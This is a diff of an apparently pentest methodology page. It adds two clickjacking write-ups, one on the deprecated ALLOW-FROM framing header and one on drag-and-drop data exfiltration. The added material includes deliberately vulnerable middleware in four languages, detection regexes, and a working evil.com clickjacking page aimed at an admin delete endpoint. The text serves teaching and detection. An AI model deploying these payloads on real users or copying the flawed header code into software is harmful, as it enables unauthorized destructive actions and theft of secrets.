@@ -313,90 +313,92 @@ Load the HTML file in the browser and confirm that the account managers page ren
 
 ### White Box
 
+#### State Mutation via Deprecated X-Frame-Options: ALLOW-FROM Fallback Asymmetr
+
 {% stepper %}
 {% step %}
-
+Map the entire target system using Burp Suite. Focus on B2B SaaS platforms, enterprise embedded widgets (e.g., payment gateways, booking calendars, analytics dashboards), or partner integrations that are explicitly designed to be framed by authorized third parties
 {% endstep %}
 
 {% step %}
-
+Draw the application's architecture and trust boundaries inside XMind
 {% endstep %}
 
 {% step %}
-
+Decompile or reverse engineer the API Gateway or edge routing middleware responsible for injecting HTTP security headers
 {% endstep %}
 
 {% step %}
-
+Identify the "Dynamic Framing Authorization" architecture. To prevent universal Clickjacking, the application must restrict framing. However, because the platform serves thousands of unique partner domains, it cannot hardcode a single domain
 {% endstep %}
 
 {% step %}
-
+Investigate the header generation pipeline. The developer queries the database for the active partner's domain and dynamically constructs the HTTP security header to authorize the iframe embed
 {% endstep %}
 
 {% step %}
-
+Analyze the protocol implementation. The developer, relying on legacy documentation or outdated security compliance checklists, utilizes the `X-Frame-Options` header with the `ALLOW-FROM` directive (e.g., `X-Frame-Options: ALLOW-FROM [https://trusted-partner.com](https://trusted-partner.com)`)
 {% endstep %}
 
 {% step %}
-
+Discover the fatal protocol desynchronization: The developer assumes that all web browsers globally respect and enforce the `ALLOW-FROM` directive. They fail to implement the modern W3C standard equivalent: `Content-Security-Policy: frame-ancestors`
 {% endstep %}
 
 {% step %}
-
+Understand the browser deprecation vulnerability: Modern browsers (Google Chrome, Safari, Mozilla Firefox) entirely deprecated and removed support for the `X-Frame-Options: ALLOW-FROM` directive years ago due to parsing inconsistencies. When a modern browser encounters `ALLOW-FROM`, it completely ignores the header
 {% endstep %}
 
 {% step %}
-
+Formulate the UI Redressing payload. Because the legacy header is ignored and no modern `frame-ancestors` CSP exists, the browser defaults to `ALLOWALL`. The highly sensitive endpoint is universally frameable by any attacker on the internet
 {% endstep %}
 
 {% step %}
-
+Identify a high-value, state-mutating endpoint on the target application that relies on cookie-based authentication (e.g., `[https://api.enterprise.tld/admin/users/delete?id=99](https://api.enterprise.tld/admin/users/delete?id=99)` or `/account/transfer`)
 {% endstep %}
 
 {% step %}
-
+Construct an attacker-controlled HTML page. Embed the sensitive enterprise endpoint inside an `<iframe>`
 {% endstep %}
 
 {% step %}
-
+Apply advanced CSS to execute the visual redressing: set the iframe's `opacity` to `0` or `0.001` (rendering it invisible but physically interactive), stretch it across the viewport, and manipulate the `z-index` to ensure it sits at the absolute top of the rendering stack
 {% endstep %}
 
 {% step %}
-
+Position a highly attractive, benign decoy button (e.g., "Click here to claim your prize!" or "Play Video") directly underneath the precise X/Y coordinates of the invisible "Confirm Delete" or "Authorize Transfer" button within the framed enterprise application
 {% endstep %}
 
 {% step %}
-
+Distribute the malicious page to an authenticated enterprise administrator
 {% endstep %}
 
 {% step %}
-
+The victim views the page and attempts to click the benign decoy button. Because the invisible iframe sits on top of the Z-axis, the browser routes the physical hardware click directly into the framed enterprise application. The application, receiving a legitimate, authenticated user interaction, processes the state mutation. The attacker effortlessly executes unauthorized administrative actions via an invisible, proxy-driven interaction, exploiting the backend's reliance on a defunct security protocol
 
 **VSCode Regex Detection**
 
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-\b(?:new\s+Regex\s*\([\s\S]{0,120}?(?:constraint|validation|pattern)|Regex\s*\(\s*\w*(?:Pattern|pattern)\w*\s*\)|RegexOptions[\s\S]{0,100}?pattern)
+(Headers\.Add\("X-Frame-Options",\s*\$?"ALLOW-FROM)
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-\b(?:Pattern\.compile\s*\([\s\S]{0,120}?(?:constraint\.pattern\(\)|pattern|regex)|Pattern\.compile\s*\(\s*\w+\s*\)|javax\.validation.*pattern)
+(addHeader\("X-Frame-Options",\s*"ALLOW-FROM)
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-\b(?:preg_match\s*\(\s*\$constraint->pattern\s*\(|preg_match\s*\([\s\S]{0,120}?(?:\$pattern|\$regex)|new\s+RegexValidator\s*\([\s\S]{0,100}?pattern)
+(header\("X-Frame-Options:\s*ALLOW-FROM)
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-\b(?:new\s+RegExp\s*\(\s*(?:directive\.arguments\.pattern|pattern|regex)[\s\S]{0,80}?\)|RegExp\s*\([\s\S]{0,100}?pattern|\.match\s*\(\s*(?:pattern|regex))
+(setHeader\(['"]X-Frame-Options['"],\s*`?ALLOW-FROM)
 ```
 {% endtab %}
 {% endtabs %}
@@ -406,25 +408,25 @@ Load the HTML file in the browser and confirm that the account managers page ren
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-new\s+Regex\(.*(pattern|constraint)|Regex\(.*pattern
+Headers\.Add\(\"X-Frame-Options\",\s*\\$\?\"ALLOW-FROM
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-Pattern\.compile\(constraint\.pattern\(\)\)|Pattern\.compile\(.*pattern
+addHeader\(\"X-Frame-Options\",\s*\"ALLOW-FROM
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-preg_match\(\$constraint->pattern|preg_match\(.*\$pattern
+header\(\"X-Frame-Options:\s*ALLOW-FROM
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
+setHeader\(['\"]X-Frame-Options['\"],\s*`?ALLOW-FROM
 ```
 {% endtab %}
 {% endtabs %}
@@ -434,42 +436,32 @@ new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
 {% tabs %}
 {% tab title="C#" %}
 ```csharp
-public class ConstraintValidationMiddleware
+public class FramingAuthorizationMiddleware
 {
-    private readonly FieldDelegate _next;
-    private readonly ConcurrentDictionary<string, Regex> _compiledConstraints = new();
+    private readonly RequestDelegate _next;
+    private readonly IPartnerRepository _partnerRepo;
 
-    public ConstraintValidationMiddleware(FieldDelegate next)
+    public async Task InvokeAsync(HttpContext context)
     {
-        _next = next;
-    }
+        var partnerId = context.Request.Query["partnerId"].FirstOrDefault();
 
-    public async Task InvokeAsync(IMiddlewareContext context)
-    {
-        // [1]
-        // [2]
-        var field = context.Selection.Field;
-        var constraintDirective = field.Directives.FirstOrDefault(d => d.Name == "constraint");
-
-        if (constraintDirective != null)
+        if (!string.IsNullOrEmpty(partnerId))
         {
-            var pattern = constraintDirective.GetArgument<string>("pattern");
-            
-            // [3]
-            var regex = _compiledConstraints.GetOrAdd(field.Name, p => new Regex(p, RegexOptions.Compiled));
+            var partnerDomain = await _partnerRepo.GetDomainAsync(partnerId);
 
-            foreach (var argument in context.Selection.SyntaxNode.Arguments)
-            {
-                var inputString = argument.Value.ToString();
-                
-                // [4]
-                // Blocks the main GraphQL execution pipeline synchronously
-                if (!regex.IsMatch(inputString))
-                {
-                    context.ReportError("Constraint validation failed.");
-                    return;
-                }
-            }
+            // [1]
+            // [2]
+            // The developer relies on deprecated legacy headers for clickjacking protection.
+            // Modern browsers explicitly ignore ALLOW-FROM, rendering the page universally frameable.
+            // [3]
+            // [4]
+            context.Response.Headers.Add("X-Frame-Options", $"ALLOW-FROM {partnerDomain}");
+            
+            // Fatal omission: Missing Content-Security-Policy: frame-ancestors
+        }
+        else
+        {
+            context.Response.Headers.Add("X-Frame-Options", "DENY");
         }
 
         await _next(context);
@@ -480,58 +472,35 @@ public class ConstraintValidationMiddleware
 
 {% tab title="Java" %}
 ```java
-public class ConstraintValidationMiddleware {
+@Component
+public class FramingAuthorizationFilter implements Filter {
 
-    private final FieldDelegate next;
+    @Autowired
+    private PartnerService partnerService;
 
-    private final ConcurrentHashMap<String, Pattern> compiledConstraints = new ConcurrentHashMap<>();
+    @Override
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
+        HttpServletRequest req = (HttpServletRequest) request;
+        HttpServletResponse res = (HttpServletResponse) response;
 
-    public ConstraintValidationMiddleware(FieldDelegate next) {
-        this.next = next;
-    }
-
-    public CompletableFuture<Void> invokeAsync(MiddlewareContext context) {
+        String partnerId = req.getParameter("partnerId");
 
         // [1]
         // [2]
-        Field field = context.getSelection().getField();
-
-        Directive constraintDirective = field.getDirectives()
-                .stream()
-                .filter(d -> d.getName().equals("constraint"))
-                .findFirst()
-                .orElse(null);
-
-        if (constraintDirective != null) {
-
-            String pattern = constraintDirective.getArgument("pattern");
-
+        if (partnerId != null) {
+            String partnerDomain = partnerService.getDomainForPartner(partnerId);
+            
             // [3]
-            Pattern regex = compiledConstraints.computeIfAbsent(
-                    field.getName(),
-                    p -> Pattern.compile(pattern)
-            );
-
-            for (Argument argument : context.getSelection()
-                    .getSyntaxNode()
-                    .getArguments()) {
-
-                String inputString = argument.getValue().toString();
-
-                // [4]
-                // Blocks GraphQL execution pipeline synchronously
-                if (!regex.matcher(inputString).matches()) {
-
-                    context.reportError(
-                        "Constraint validation failed."
-                    );
-
-                    return CompletableFuture.completedFuture(null);
-                }
-            }
+            // [4]
+            // Java Spring Security natively sets DENY or SAMEORIGIN, but developers 
+            // often override it to ALLOW-FROM to support legacy multi-tenant architectures
+            // without realizing it exposes the application to modern browsers.
+            res.setHeader("X-Frame-Options", "ALLOW-FROM " + partnerDomain);
+        } else {
+            res.setHeader("X-Frame-Options", "SAMEORIGIN");
         }
 
-        return next.invoke(context);
+        chain.doFilter(request, response);
     }
 }
 ```
@@ -541,78 +510,28 @@ public class ConstraintValidationMiddleware {
 
 {% tab title="PHP" %}
 ```php
-class ConstraintValidationMiddleware
+class FramingMiddleware
 {
-    private $next;
-
-    private array $compiledConstraints = [];
-
-    public function __construct(callable $next)
+    public function handle(Request $request, Closure $next)
     {
-        $this->next = $next;
-    }
+        $response = $next($request);
+        $partnerId = $request->query('partnerId');
 
-
-    public function invokeAsync($context)
-    {
         // [1]
         // [2]
-        $field = $context->selection->field;
-
-        $constraintDirective = null;
-
-        foreach ($field->directives as $directive) {
-
-            if ($directive->name === "constraint") {
-                $constraintDirective = $directive;
-                break;
-            }
-        }
-
-
-        if ($constraintDirective !== null) {
-
-            $pattern = $constraintDirective
-                ->getArgument("pattern");
-
-
+        if ($partnerId) {
+            $partnerDomain = PartnerService::getDomain($partnerId);
+            
             // [3]
-            if (!isset($this->compiledConstraints[$field->name])) {
-
-                $this->compiledConstraints[$field->name] =
-                    $pattern;
-            }
-
-            $regex = $this->compiledConstraints[$field->name];
-
-
-            foreach (
-                $context->selection
-                    ->syntaxNode
-                    ->arguments as $argument
-            ) {
-
-                $inputString = (string)$argument->value;
-
-
-                // [4]
-                // Blocks GraphQL execution pipeline synchronously
-                if (!preg_match($regex, $inputString)) {
-
-                    $context->reportError(
-                        "Constraint validation failed."
-                    );
-
-                    return null;
-                }
-            }
+            // [4]
+            // The browser's console will display a warning that ALLOW-FROM is deprecated, 
+            // but the backend developer never sees client-side console warnings.
+            $response->header('X-Frame-Options', "ALLOW-FROM {$partnerDomain}");
+        } else {
+            $response->header('X-Frame-Options', 'SAMEORIGIN');
         }
 
-
-        return call_user_func(
-            $this->next,
-            $context
-        );
+        return $response;
     }
 }
 ```
@@ -620,136 +539,172 @@ class ConstraintValidationMiddleware
 
 {% tab title="Node.js" %}
 ```javascript
-const { ApolloGateway } = require('@apollo/gateway');
+class FramingMiddleware {
+    static async authorizeIframe(req, res, next) {
+        let partnerId = req.query.partnerId;
 
-class ConstraintValidationPlugin {
-    // [1]
-    // [2]
-    // Executes during Supergraph composition
-    requestDidStart({ schema }) {
-        const compiledRegexes = new Map();
+        if (partnerId) {
+            let partnerDomain = await db.Partner.getDomain(partnerId);
 
-        // Recursively extract @constraint directives from the composed schema
-        Object.values(schema.getTypeMap()).forEach(type => {
-            if (type.astNode && type.astNode.directives) {
-                const constraint = type.astNode.directives.find(d => d.name.value === 'constraint');
-                if (constraint) {
-                    const patternArg = constraint.arguments.find(a => a.name.value === 'pattern');
-                    if (patternArg) {
-                        // [3]
-                        // Blindly compiles the Subgraph-provided regex into the Gateway's memory
-                        compiledRegexes.set(type.name, new RegExp(patternArg.value.value));
-                    }
-                }
-            }
-        });
+            // [1]
+            // [2]
+            // Chrome and Firefox will drop this header. The page will load in any iframe.
+            // [3]
+            // [4]
+            res.setHeader('X-Frame-Options', `ALLOW-FROM ${partnerDomain}`);
+        } else {
+            res.setHeader('X-Frame-Options', 'SAMEORIGIN');
+        }
 
-        return {
-            async executionDidStart({ request }) {
-                // [4]
-                // Intercepts variables BEFORE passing the query to the Subgraph
-                for (const [key, value] of Object.entries(request.variables || {})) {
-                    const regex = compiledRegexes.get(key); // Simplified type matching for brevity
-                    if (regex && !regex.test(value)) {
-                        throw new Error(`Validation failed for ${key}`);
-                    }
-                }
-            }
-        };
+        next();
     }
 }
 ```
 {% endtab %}
 {% endtabs %}
+{% endstep %}
+
+{% step %}
+\[1] The architecture supports embedded widget integrations, explicitly requiring the application to disable strict `DENY` or `SAMEORIGIN` framing policies on specific routes, \[2] To enforce security, developers attempt to whitelist specific, trusted partner domains, \[3] Developers utilize the `X-Frame-Options: ALLOW-FROM` header, relying on outdated HTTP RFCs and legacy compliance scanners that still flag the absence of `X-Frame-Options` while ignoring the modern CSP equivalent, \[4] The execution paradox. The backend successfully calculates the trusted domain and attaches the security header, fulfilling the developer's logical intent. However, major web browser engines intentionally stripped support for `ALLOW-FROM` due to the impossibility of validating deep, nested iframe chains. When Chrome or Safari encounters this header, it discards it entirely. Because the developer failed to provide the modern fallback (`Content-Security-Policy: frame-ancestors`), the browser defaults to an open security model. The attacker effortlessly encapsulates the highly privileged enterprise route within a hostile origin, constructing an invisible overlay that converts innocuous user interactions into authenticated, catastrophic state mutations
+
+```http
+// 1. Attacker verifies the target endpoint uses the deprecated header.
+GET /admin/users/delete?id=105&partnerId=88 HTTP/1.1
+Host: api.enterprise.tld
+
+// Backend returns:
+HTTP/1.1 200 OK
+X-Frame-Options: ALLOW-FROM https://trusted-partner.com
+Content-Type: text/html
+
+// 2. Attacker hosts a malicious webpage at https://evil.com/clickjack.html.
+// 3. The attacker crafts the CSS and HTML to perfectly overlay a decoy button 
+//    beneath the invisible iframe's "Confirm Delete" button.
+
+<html>
+<head>
+    <style>
+        iframe {
+            position: absolute;
+            top: 0; left: 0;
+            width: 1000px; height: 800px;
+            opacity: 0.0001; /* Invisible but clickable */
+            z-index: 10;
+        }
+        .decoy-button {
+            position: absolute;
+            top: 450px; left: 300px; /* Aligned with the iframe's target button */
+            z-index: 1;
+        }
+    </style>
+</head>
+<body>
+    <button class="decoy-button">Click here to claim your $500 Gift Card!</button>
+    <iframe src="https://api.enterprise.tld/admin/users/delete?id=105&partnerId=88"></iframe>
+</body>
+</html>
+
+// 4. The victim (an Enterprise Admin) visits https://evil.com/clickjack.html.
+// 5. The Chrome browser ignores the `ALLOW-FROM` header and renders the iframe.
+// 6. The victim clicks the "Claim Gift Card" button.
+// 7. The browser registers the click on the invisible iframe's "Confirm Delete" button.
+// 8. The enterprise application deletes User 105.
+```
+{% endstep %}
+
+{% step %}
+To support complex B2B iframe integrations, platform architects implemented dynamic origin whitelisting for embedded routes. The security failure stemmed from a deep architectural disconnect between backend header generation and modern browser enforcement policies. Developers relied exclusively on the `X-Frame-Options: ALLOW-FROM` directive, erroneously equating legacy compliance with functional security. Modern browser engines, having deprecated this directive in favor of `Content-Security-Policy: frame-ancestors`, silently ignored the backend's explicit instructions. This degradation dropped the application into an inherently insecure default state. The attacker exploited this by framing the authenticated, state-mutating endpoint across an unauthorized origin. By employing CSS opacity and Z-index manipulation, the attacker decoupled the user's visual perception from the browser's physical click routing, successfully hijacking the administrator's physical intent to execute high-privilege, destructive operations on the enterprise platform
 {% endstep %}
 {% endstepper %}
 
 ***
 
+#### Cross-Origin Data Exfiltration via HTML5 Drag-and-Drop (DnD) UI Redressing
+
 {% stepper %}
 {% step %}
-
+Map the entire target system using Burp Suite. Focus on endpoints that intentionally omit framing protection to serve as "Public" or "Shareable" resources (e.g., Public Profiles, Shared Document Links, or Status Pages), but conditionally render highly sensitive data if the viewing user happens to be authenticated
 {% endstep %}
 
 {% step %}
-
+Draw the application's architecture and trust boundaries inside XMind
 {% endstep %}
 
 {% step %}
-
+Decompile or reverse engineer the application's routing and security header middleware
 {% endstep %}
 
 {% step %}
-
+Identify the "Public Share Bypass" architecture. To allow users to embed their public profiles or shared invoices in external blogs or notion pages, the developer explicitly removes the `X-Frame-Options` and `frame-ancestors` headers on specific API routes (e.g., `GET /share/profile/{id}`)
 {% endstep %}
 
 {% step %}
-
+Investigate the conditional rendering logic. While the route is intended for public consumption, the backend template engine (or frontend SPA) checks the user's active session cookie. If the user viewing the public iframe is actually the _owner_ of the profile, the UI conditionally renders private data (e.g., an API Key, a hidden email address, or a password reset link) within the framed view
 {% endstep %}
 
 {% step %}
-
+Analyze the standard Clickjacking defenses. Standard UI Redressing relies on forcing a victim to _click_ a button to mutate state (e.g., clicking "Delete"). However, exfiltrating data (reading the API key) via Clickjacking is impossible because the browser's Same-Origin Policy (SOP) prevents the attacker's parent frame from reading the DOM of the cross-origin iframe
 {% endstep %}
 
 {% step %}
-
+Discover the HTML5 API loophole: The HTML5 Drag-and-Drop (DnD) API fundamentally bypasses the Same-Origin Policy. If a user physically clicks and drags an element (like highlighted text or a hyperlink) from an iframe into a different frame or window, the browser's native `DataTransfer` object carries the payload across the cross-origin boundary
 {% endstep %}
 
 {% step %}
-
+Understand the vulnerability: If an attacker can frame a page containing sensitive data, they can trick the user into highlighting and dragging that data out of the iframe and dropping it into an attacker-controlled drop zone, completely breaking cross-origin read restrictions
 {% endstep %}
 
 {% step %}
-
+Formulate the Zero-Click Data Exfiltration payload. Identify a sensitive, draggable element within the conditionally rendered, frameable page (e.g., `<a href="[https://api.tld/reset?token=SECRET](https://api.tld/reset?token=SECRET)">Reset</a>` or a raw text field containing an API Key)
 {% endstep %}
 
 {% step %}
-
+Construct an attacker-controlled HTML page containing the target iframe, styled with `opacity: 0.001`
 {% endstep %}
 
 {% step %}
-
+Build a complex, interactive decoy UI beneath the iframe. The UI must psychologically coerce the user into performing a specific sequence: clicking down at Coordinate A, dragging the mouse, and releasing the click at Coordinate B. (e.g., "Drag the puzzle piece to the circle to prove you are human and unlock the video!")
 {% endstep %}
 
 {% step %}
-
+Align the invisible iframe such that "Coordinate A" perfectly overlaps the sensitive API Key or Link in the enterprise application
 {% endstep %}
 
 {% step %}
-
+Align "Coordinate B" with a visible, attacker-controlled `<div id="dropzone">` in the parent HTML
 {% endstep %}
 
 {% step %}
-
+Distribute the payload to the authenticated victim
 {% endstep %}
 
 {% step %}
-
+The victim attempts to drag the fake "puzzle piece". In reality, their cursor selects and drags the invisible sensitive text/link from the enterprise iframe. When they drop the item into the attacker's visible drop zone, the attacker's JavaScript intercepts the `ondrop` event, reads `event.dataTransfer.getData('text')`, and silently exfiltrates the highly classified API key to the attacker's server, completely shattering the Same-Origin Policy via physical user coercion
 
 **VSCode Regex Detection**
 
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-\b(?:new\s+Regex\s*\([\s\S]{0,120}?(?:constraint|validation|pattern)|Regex\s*\(\s*\w*(?:Pattern|pattern)\w*\s*\)|RegexOptions[\s\S]{0,100}?pattern)
+(context\.Response\.Headers\.Remove\("X-Frame-Options"\))
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-\b(?:Pattern\.compile\s*\([\s\S]{0,120}?(?:constraint\.pattern\(\)|pattern|regex)|Pattern\.compile\s*\(\s*\w+\s*\)|javax\.validation.*pattern)
+(policy\.disableFrameOptions\(\))
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-\b(?:preg_match\s*\(\s*\$constraint->pattern\s*\(|preg_match\s*\([\s\S]{0,120}?(?:\$pattern|\$regex)|new\s+RegexValidator\s*\([\s\S]{0,100}?pattern)
+(\$response->headers->remove\('X-Frame-Options'\))
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-\b(?:new\s+RegExp\s*\(\s*(?:directive\.arguments\.pattern|pattern|regex)[\s\S]{0,80}?\)|RegExp\s*\([\s\S]{0,100}?pattern|\.match\s*\(\s*(?:pattern|regex))
+(if\s*\(req\.path\.startsWith\('/share/'\)\)\s*\{\s*res\.removeHeader\('X-Frame-Options'\))
 ```
 {% endtab %}
 {% endtabs %}
@@ -759,25 +714,25 @@ class ConstraintValidationPlugin {
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-new\s+Regex\(.*(pattern|constraint)|Regex\(.*pattern
+context\.Response\.Headers\.Remove\(\"X-Frame-Options\"\)
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-Pattern\.compile\(constraint\.pattern\(\)\)|Pattern\.compile\(.*pattern
+policy\.disableFrameOptions\(\)
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-preg_match\(\$constraint->pattern|preg_match\(.*\$pattern
+\$response->headers->remove\('X-Frame-Options'\)
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
+if\s*\(req\.path\.startsWith\('/share/'\)\)\s*\{\s*res\.removeHeader\('X-Frame-Options'\)
 ```
 {% endtab %}
 {% endtabs %}
@@ -787,42 +742,22 @@ new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
 {% tabs %}
 {% tab title="C#" %}
 ```csharp
-public class ConstraintValidationMiddleware
+public class SecurityHeadersMiddleware
 {
-    private readonly FieldDelegate _next;
-    private readonly ConcurrentDictionary<string, Regex> _compiledConstraints = new();
+    private readonly RequestDelegate _next;
 
-    public ConstraintValidationMiddleware(FieldDelegate next)
+    public async Task InvokeAsync(HttpContext context)
     {
-        _next = next;
-    }
+        context.Response.Headers.Add("X-Frame-Options", "DENY");
+        context.Response.Headers.Add("Content-Security-Policy", "frame-ancestors 'none'");
 
-    public async Task InvokeAsync(IMiddlewareContext context)
-    {
         // [1]
         // [2]
-        var field = context.Selection.Field;
-        var constraintDirective = field.Directives.FirstOrDefault(d => d.Name == "constraint");
-
-        if (constraintDirective != null)
+        if (context.Request.Path.StartsWithSegments("/public/share"))
         {
-            var pattern = constraintDirective.GetArgument<string>("pattern");
-            
-            // [3]
-            var regex = _compiledConstraints.GetOrAdd(field.Name, p => new Regex(p, RegexOptions.Compiled));
-
-            foreach (var argument in context.Selection.SyntaxNode.Arguments)
-            {
-                var inputString = argument.Value.ToString();
-                
-                // [4]
-                // Blocks the main GraphQL execution pipeline synchronously
-                if (!regex.IsMatch(inputString))
-                {
-                    context.ReportError("Constraint validation failed.");
-                    return;
-                }
-            }
+            // Disabling protection to allow embedding in external blogs/forums
+            context.Response.Headers.Remove("X-Frame-Options");
+            context.Response.Headers.Remove("Content-Security-Policy");
         }
 
         await _next(context);
@@ -833,139 +768,80 @@ public class ConstraintValidationMiddleware
 
 {% tab title="Java" %}
 ```java
-public class ConstraintValidationMiddleware {
+@Component
+public class SecurityHeadersInterceptor
+        implements HandlerInterceptor {
 
-    private final FieldDelegate next;
 
-    private final ConcurrentHashMap<String, Pattern> compiledConstraints = new ConcurrentHashMap<>();
+    @Override
+    public void afterCompletion(
+            HttpServletRequest request,
+            HttpServletResponse response,
+            Object handler,
+            Exception ex
+    ) {
 
-    public ConstraintValidationMiddleware(FieldDelegate next) {
-        this.next = next;
-    }
 
-    public CompletableFuture<Void> invokeAsync(MiddlewareContext context) {
+        response.setHeader(
+                "X-Frame-Options",
+                "DENY"
+        );
+
+
+        response.setHeader(
+                "Content-Security-Policy",
+                "frame-ancestors 'none'"
+        );
+
+
 
         // [1]
         // [2]
-        Field field = context.getSelection().getField();
+        // [3]
+        // [4]
+        if (request.getRequestURI()
+                .startsWith("/public/share/")) {
 
-        Directive constraintDirective = field.getDirectives()
-                .stream()
-                .filter(d -> d.getName().equals("constraint"))
-                .findFirst()
-                .orElse(null);
 
-        if (constraintDirective != null) {
+            response
+                .setHeader(
+                    "X-Frame-Options",
+                    ""
+                );
 
-            String pattern = constraintDirective.getArgument("pattern");
 
-            // [3]
-            Pattern regex = compiledConstraints.computeIfAbsent(
-                    field.getName(),
-                    p -> Pattern.compile(pattern)
-            );
-
-            for (Argument argument : context.getSelection()
-                    .getSyntaxNode()
-                    .getArguments()) {
-
-                String inputString = argument.getValue().toString();
-
-                // [4]
-                // Blocks GraphQL execution pipeline synchronously
-                if (!regex.matcher(inputString).matches()) {
-
-                    context.reportError(
-                        "Constraint validation failed."
-                    );
-
-                    return CompletableFuture.completedFuture(null);
-                }
-            }
+            response
+                .setHeader(
+                    "Content-Security-Policy",
+                    ""
+                );
         }
-
-        return next.invoke(context);
     }
 }
 ```
-
-
 {% endtab %}
 
 {% tab title="PHP" %}
 ```php
-class ConstraintValidationMiddleware
+class SecurityHeadersMiddleware
 {
-    private $next;
-
-    private array $compiledConstraints = [];
-
-    public function __construct(callable $next)
+    public function handle(Request $request, Closure $next)
     {
-        $this->next = $next;
-    }
+        $response = $next($request);
 
+        $response->header('X-Frame-Options', 'DENY');
+        $response->header('Content-Security-Policy', "frame-ancestors 'none'");
 
-    public function invokeAsync($context)
-    {
         // [1]
         // [2]
-        $field = $context->selection->field;
-
-        $constraintDirective = null;
-
-        foreach ($field->directives as $directive) {
-
-            if ($directive->name === "constraint") {
-                $constraintDirective = $directive;
-                break;
-            }
+        // [3]
+        // [4]
+        if ($request->is('public/share/*')) {
+            $response->headers->remove('X-Frame-Options');
+            $response->headers->remove('Content-Security-Policy');
         }
 
-
-        if ($constraintDirective !== null) {
-
-            $pattern = $constraintDirective
-                ->getArgument("pattern");
-
-
-            // [3]
-            if (!isset($this->compiledConstraints[$field->name])) {
-
-                $this->compiledConstraints[$field->name] =
-                    $pattern;
-            }
-
-            $regex = $this->compiledConstraints[$field->name];
-
-
-            foreach (
-                $context->selection
-                    ->syntaxNode
-                    ->arguments as $argument
-            ) {
-
-                $inputString = (string)$argument->value;
-
-
-                // [4]
-                // Blocks GraphQL execution pipeline synchronously
-                if (!preg_match($regex, $inputString)) {
-
-                    $context->reportError(
-                        "Constraint validation failed."
-                    );
-
-                    return null;
-                }
-            }
-        }
-
-
-        return call_user_func(
-            $this->next,
-            $context
-        );
+        return $response;
     }
 }
 ```
@@ -973,400 +849,124 @@ class ConstraintValidationMiddleware
 
 {% tab title="Node.js" %}
 ```javascript
-const { ApolloGateway } = require('@apollo/gateway');
+class SecurityHeadersMiddleware {
+    static applyHeaders(req, res, next) {
+        // Apply default strict framing protection
+        res.setHeader('X-Frame-Options', 'DENY');
+        res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
 
-class ConstraintValidationPlugin {
-    // [1]
-    // [2]
-    // Executes during Supergraph composition
-    requestDidStart({ schema }) {
-        const compiledRegexes = new Map();
-
-        // Recursively extract @constraint directives from the composed schema
-        Object.values(schema.getTypeMap()).forEach(type => {
-            if (type.astNode && type.astNode.directives) {
-                const constraint = type.astNode.directives.find(d => d.name.value === 'constraint');
-                if (constraint) {
-                    const patternArg = constraint.arguments.find(a => a.name.value === 'pattern');
-                    if (patternArg) {
-                        // [3]
-                        // Blindly compiles the Subgraph-provided regex into the Gateway's memory
-                        compiledRegexes.set(type.name, new RegExp(patternArg.value.value));
-                    }
-                }
-            }
-        });
-
-        return {
-            async executionDidStart({ request }) {
-                // [4]
-                // Intercepts variables BEFORE passing the query to the Subgraph
-                for (const [key, value] of Object.entries(request.variables || {})) {
-                    const regex = compiledRegexes.get(key); // Simplified type matching for brevity
-                    if (regex && !regex.test(value)) {
-                        throw new Error(`Validation failed for ${key}`);
-                    }
-                }
-            }
-        };
-    }
-}
-```
-{% endtab %}
-{% endtabs %}
-{% endstep %}
-{% endstepper %}
-
-***
-
-{% stepper %}
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-
-**VSCode Regex Detection**
-
-{% tabs %}
-{% tab title="C#" %}
-```regexp
-\b(?:new\s+Regex\s*\([\s\S]{0,120}?(?:constraint|validation|pattern)|Regex\s*\(\s*\w*(?:Pattern|pattern)\w*\s*\)|RegexOptions[\s\S]{0,100}?pattern)
-```
-{% endtab %}
-
-{% tab title="Java" %}
-```regexp
-\b(?:Pattern\.compile\s*\([\s\S]{0,120}?(?:constraint\.pattern\(\)|pattern|regex)|Pattern\.compile\s*\(\s*\w+\s*\)|javax\.validation.*pattern)
-```
-{% endtab %}
-
-{% tab title="PHP" %}
-```regexp
-\b(?:preg_match\s*\(\s*\$constraint->pattern\s*\(|preg_match\s*\([\s\S]{0,120}?(?:\$pattern|\$regex)|new\s+RegexValidator\s*\([\s\S]{0,100}?pattern)
-```
-{% endtab %}
-
-{% tab title="Node.js" %}
-```regexp
-\b(?:new\s+RegExp\s*\(\s*(?:directive\.arguments\.pattern|pattern|regex)[\s\S]{0,80}?\)|RegExp\s*\([\s\S]{0,100}?pattern|\.match\s*\(\s*(?:pattern|regex))
-```
-{% endtab %}
-{% endtabs %}
-
-**RipGrep Regex Detection**
-
-{% tabs %}
-{% tab title="C#" %}
-```regexp
